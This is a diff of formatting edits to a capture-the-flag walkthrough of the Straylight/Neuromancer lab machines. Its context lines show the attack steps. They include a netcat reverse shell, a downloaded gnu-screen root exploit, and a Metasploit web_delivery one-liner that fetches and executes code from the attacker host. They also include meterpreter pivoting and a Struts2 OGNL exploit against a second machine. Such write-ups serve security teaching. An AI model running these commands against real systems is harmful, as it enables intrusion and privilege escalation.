@@ -151,6 +151,7 @@ root@kali:~# nc -nvlp 4444
 >uname -a  
 >Linux straylight 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux  
 >python -c 'import pty;pty.spawn("/bin/bash")'  
+
 www-data@straylight:/var/www/html/turing-bolo$  
   
 ### ROOT SHELL  
@@ -194,10 +195,10 @@ www-data@straylight:/tmp$ wget 192.168.148.3/44154.sh
 www-data@straylight:/tmp$ chmod +x 44154.sh  
 www-data@straylight:/tmp$ ./44154.sh  
 >~ gnu/screenroot ~  
->[+] First, we create our shell and library...  
->[+] Now we create our /etc/ld.so.preload file...  
->[+] Triggering...  
->[+] done!  
+>\[+\] First, we create our shell and library...  
+>\[+\] Now we create our /etc/ld.so.preload file...  
+>\[+\] Triggering...  
+>\[+\] done!  
 >No Sockets found in /tmp/screens/S-www-data.  
 >  
 >id  
@@ -269,16 +270,13 @@ msf exploit(multi/script/web_delivery) > run
 >python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('hxxp://192.168.148.3:8080/OGsIAmtnMxP2Gv0');exec(r.read());"  
 
 msf5 exploit(multi/script/web_delivery) >   
->[*] Sending stage (53770 bytes) to 192.168.148.5  
->[*] Meterpreter session 1 opened (192.168.148.3:4446 -> 192.168.148.5:50706) at 2019-04-13 13:24:06 -0500  
+>\[*\] Sending stage (53770 bytes) to 192.168.148.5  
+>\[*\] Meterpreter session 1 opened (192.168.148.3:4446 -> 192.168.148.5:50706) at 2019-04-13 13:24:06 -0500  
   
 msf5 exploit(multi/script/web_delivery) > sessions -l  
 >  
 >Active sessions  
->===============  
->  
 >  Id  Name  Type                      Information        Connection  
->  --  ----  ----                      -----------        ----------  
 >  1         meterpreter python/linux  root @ straylight  192.168.148.3:4446 -> 192.168.148.5:50706 (192.168.148.5)  
   
 msf5 exploit(multi/script/web_delivery) > sessions -i 1  
@@ -296,18 +294,15 @@ Now we set up the route to the second machine:
 meterpreter > run autoroute -s 192.168.111.0/24  
 meterpreter > run autoroute -p  
 >  
->Active Routing Table  
->====================  
->  
+>Active Routing Table    
 >   Subnet             Netmask            Gateway  
->   ------             -------            -------  
 >   192.168.111.0      255.255.255.0      Session 1  
   
 Perfect. We only need to set up our proxy socks with the socks4a module:  
   
 msf5 auxiliary(server/socks4a) > run  
->[*] Auxiliary module running as background job 1.  
->[*] Starting the socks4a proxy server  
+>\[*\] Auxiliary module running as background job 1.  
+>\[*\] Starting the socks4a proxy server  
   
   
 Now we can reach the second machine from our host.  
@@ -355,9 +350,9 @@ msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI struts2_2.3.1
 >TARGETURI => struts2_2.3.15.1-showcase/showcase.action  
 
 msf5 exploit(multi/http/struts2_content_type_ognl) > run  
->[*] Started bind TCP handler against 192.168.111.5:4450  
->[*] Sending stage (38 bytes) to 192.168.111.5  
->[*] Command shell session 2 opened (192.168.148.3-192.168.148.5:0 -> 192.168.111.5:4450) at 2019-04-13 13:47:18 -0500  
+>\[*\] Started bind TCP handler against 192.168.111.5:4450  
+>\[*\] Sending stage (38 bytes) to 192.168.111.5  
+>\[*\] Command shell session 2 opened (192.168.148.3-192.168.148.5:0 -> 192.168.111.5:4450) at 2019-04-13 13:47:18 -0500  
 >  
 >id  
 >uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)  
@@ -404,10 +399,10 @@ Great, a usefull shell. Let's just set up our ssh key and log in.
 root@kali:~# proxychains ssh -l ta 192.168.111.5 -p 34483  
 >ProxyChains-3.1 (hxxp://proxychains.sf.net)  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
-> ----------------------------------------------------------------  
+>
 >|                Neuromancer Secure Remote Access                |  
 >| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |  
-> ----------------------------------------------------------------  
+>  
 >Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)  
 >  
 > * Documentation:  https://help.ubuntu.com  
